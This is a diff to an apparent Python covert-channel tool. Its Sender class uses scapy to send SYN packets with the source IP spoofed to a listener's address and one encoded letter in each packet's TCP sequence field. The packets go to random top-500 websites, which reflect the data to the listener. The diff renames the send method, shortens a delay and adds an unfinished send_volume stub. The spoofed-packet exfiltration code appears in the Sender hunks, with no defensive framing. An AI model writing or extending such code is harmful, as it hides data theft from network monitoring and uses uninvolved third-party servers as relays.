@@ -5,6 +5,7 @@ import requests
 import re
 import socket
 import os
+import struct
 
 class URL_Retreiver():
         
@@ -115,7 +116,7 @@ class Sender():
     Sends a SYN packet to a random top 500 website with the IP of the listener as 
     the source address with a letter encoded in the sequence field.
     '''
-    def send(self):
+    def send_encoded(self):
         if self.encoded_message:
             self.send_setup()
             time.sleep(3)
@@ -129,7 +130,7 @@ class Sender():
                 dst_ip = self.endpoints.ipAddresses[rand_int]
                 print(f"Rand_int: {rand_int}")
                 used_index.append(rand_int)
-                time.sleep(2)
+                time.sleep(1)
                 print(f'Sending letter {letter} to {dst_ip}.....')
                 send(IP(src=self.src_ip, dst=dst_ip)/TCP(sport=self.src_port, dport=self.dst_port, seq=letter, flags="S"))
                 if len(used_index) == len(self.encoded_message):
@@ -141,6 +142,12 @@ class Sender():
 	                if rand_int not in used_index:
 	                    break                
 	            send(IP(src=self.src_ip, dst=dst_ip)/TCP(sport=self.src_port, dport=self.dst_port, seq=4294967294, flags="S"))
+
+        def send_volume(self):
+            if self.original_message:
+                self.send_setup()
+                time.sleep(3)
+                
     
 class Listener():
 
